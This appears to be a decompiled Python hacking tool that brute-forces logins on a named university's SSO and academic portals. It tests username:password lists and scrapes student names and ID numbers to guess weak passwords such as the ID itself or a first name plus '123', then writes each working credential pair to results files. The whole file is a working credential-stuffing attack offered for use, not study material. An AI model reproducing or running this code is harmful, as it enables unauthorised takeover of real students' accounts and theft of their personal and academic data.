# uncompyle6 version 3.7.4
# Python bytecode 3.8
# Decompiled from: Python 3.8.5 (default, Jul 24 2020, 12:30:11) 
# [Clang 9.0.8 (https://android.googlesource.com/toolchain/llvm-project 98c855489
# Embedded file name: <EzzKun>
import requests as req, requests.packages.urllib3
from bs4 import BeautifulSoup as bs
requests.packages.urllib3.disable_warnings()
import os, time, platform, hashlib
grey = '\x1b[90m'
red = '\x1b[91m'
green = '\x1b[92m'
yellow = '\x1b[93m'
blue = '\x1b[94m'
purple = '\x1b[95m'
cyan = '\x1b[96m'
white = '\x1b[37m'
flag = '\x1b[47;30m'
off = '\x1b[m'
ok = []
rv = platform.uname().release
me = int(hashlib.sha256(rv.encode('utf-8')).hexdigest(), 16) % 100000000
bn = f"\n{off}__  _ ____ {purple} ___     _ _ ___   {grey}v3        \n{off}\\ || |_ _/ {purple}| __|. _| | / __| __ __ _ _ _  \n{cyan}|{off} || || |  {purple}| _| {cyan}|{purple}| | | \\__ \\{cyan}/{purple} _/ {cyan}_{purple}` | ' \\ \n{off} \\__/|___| {purple}|_| \\_,_|_|_|___{cyan}/{purple}\\__\\__,_|_||_| \n"

def sso(usr, pwd):
    ses = req.Session()
    url = 'https://sso.ui.ac.id/cas/login'
    raw = ses.get(url).text
    tok = bs(raw, 'html.parser').findAll('input')
    dat = {'username':usr,  'password':pwd, 
     'lt':tok[2]['value'], 
     'execution':tok[3]['value'], 
     '_eventId':'submit'}
    res = ses.post(url, data=dat).headers
    try:
        mantap = res['Set-Cookie']
        print(f"{white}  ->{green} {usr}{white}:{green}{pwd}")
        ok.append(f"{usr}:{pwd}")
        with open('results_sso.txt', 'a') as (s):
            s.write(f"{usr}:{pwd}\n")
    except KeyError:
        print(f"{white}  ->{red} {usr}{white}:{red}{pwd}")


def acd(usr, pwd):
    url = 'https://academic.ui.ac.id/main/Authentication/Index'
    dat = {'u':usr,  'p':pwd}
    raw = req.post(url, data=dat).text
    res = bs(raw, 'html.parser').findAll('p')[0].text
    if res == 'Please wait, redirecting...':
        print(f"{white}  ->{green} {usr}{white}:{green}{pwd}")
        ok.append(f"{usr}:{pwd}")
        with open('results_academic.txt', 'a') as (s):
            s.write(f"{usr}:{pwd}\n")
    else:
        if res == 'Login Failed':
            print(f"{white}  ->{red} {usr}{white}:{red}{pwd}")
        else:
            print(f"{white}  ->{yellow} {usr}{white}:{yellow}{pwd}")


def done():
    if len(ok) != 0:
        exit(f"\n{white} Saved {cyan}{len(ok)} {white}live empas \n Thanks for use \n")
    else:
        exit(f"\n{white} Scanning done with no results :( \n Thanks for use \n")


def main():
    print(bn)
    print(end=f"\r{white}  LAPORKAN BUG JIKA ADA  ")
    try:
        akses = req.get(f"https://yutixcode.xyz/akses/ui/{me}", verify=False).status_code
        print(end='\r                          ')
        if akses != 200:
            print(end=f"\r{white}  1 : from empas.txt (sso)\n")
            print(f"{white}  2 : from empas.txt (academic)")
            print(f"{white}  3 : smart scanning (sso)")
            print(f"{white}  4 : smart scanning (academic)\n")
            inv = input(f"{white} UI{cyan}-{white}{me} {cyan}> {white}")
            if inv == '1':
                print(f"{white}\n Empas format usr{cyan}:{white}pwd ")
                pth = input(f" Input file {cyan}>{white} ")
                with open(pth, 'r') as (path):
                    lines = path.readlines()
                    print(f"{white} Read {cyan}{len(lines)}{white} lines \n Starting...\n")
                    for line in lines:
                        log = line.strip().split(':')
                        sso(log[0], log[1])
                    else:
                        done()

            elif inv == '2':
                print(f"{white}\n Empas format usr{cyan}:{white}pwd ")
                pth = input(f" Input file {cyan}>{white} ")
                with open(pth, 'r') as (path):
                    lines = path.readlines()
                    print(f"{white} Read {cyan}{len(lines)}{white} lines \n Starting...\n")
                    for line in lines:
                        log = line.strip().split(':')
                        acd(log[0], log[1])
                    else:
                        done()

            elif inv == '3':
                url = input(f" Link forlap {cyan}>{white} ")
                print()
                raw = req.get(url, verify=False).text
                resp = bs(raw, 'html.parser').find('div', {'id': 'mahasiswa'}).findAll('tr')[1:]
                for i in range(len(resp)):
                    link = resp[i].find('a')['href']
                    stat = req.get(link, verify=False).text
                    tab = bs(stat, 'html.parser').findAll('table')[0].findAll('tr')[1:]
                    for x in range(len(tab)):
                        nim = tab[x].findAll('td')[1].get_text().replace(' ', '')
                        nama = tab[x].findAll('td')[2].get_text().replace(' ', '.').lower()
                        try:
                            sso(nama.split('.')[0], nim)
                            sso(nama.split('.')[1], nim)
                            sso(nama.split('.')[2], nim)
                            sso(nama, nim)
                            sso(nama.split('.')[0], nama.split('.')[0])
                            sso(nama, nama.split('.')[0])
                            sso(nama, nama.split('.')[1])
                            sso(nama, f"{nama.split('.')[0]}123")
                            sso(nama.split('.')[0], f"{nama.split('.')[0]}123")
                        except:
                            sso(nama, nim)

                else:
                    done()

            elif inv == '4':
                url = input(f" Link forlap {cyan}>{white} ")
                print()
                raw = req.get(url, verify=False).text
                resp = bs(raw, 'html.parser').find('div', {'id': 'mahasiswa'}).findAll('tr')[1:]
                for i in range(len(resp)):
                    link = resp[i].find('a')['href']
                    stat = req.get(link, verify=False).text
                    tab = bs(stat, 'html.parser').findAll('table')[0].findAll('tr')[1:]

                for x in range(len(tab)):
                    nim = tab[x].findAll('td')[1].get_text().replace(' ', '')
                    nama = tab[x].findAll('td')[2].get_text().replace(' ', '.').lower()
                    try:
                        acd(nim, nim)
                        acd(nim, nama.split('.')[0])
                        acd(nim, nama.split('.')[1])
                        acd(nim, f"{nama.split('.')[0]}123")
                    except:
                        acd(nim, nim)

                else:
                    done()

            else:
                exit(f"\n{white} {{!}} Ngotak dong anjg!")
        else:
            print(end=f"\r{white} {{!}} Kamu tidak memiliki izin\n {{!}} YourID: {green}{me}\n")
            exit(f"{white} {{!}} Author: {green}YutixCode")
    except KeyboardInterrupt:
        exit(f"\n{white} {{!}} Keyboard Interrupted")
    except Exception as er:
        try:
            exit(f"\n{white} {{!}} {er}")
        finally:
            er = None
            del er


if __name__ == '__main__':
    main()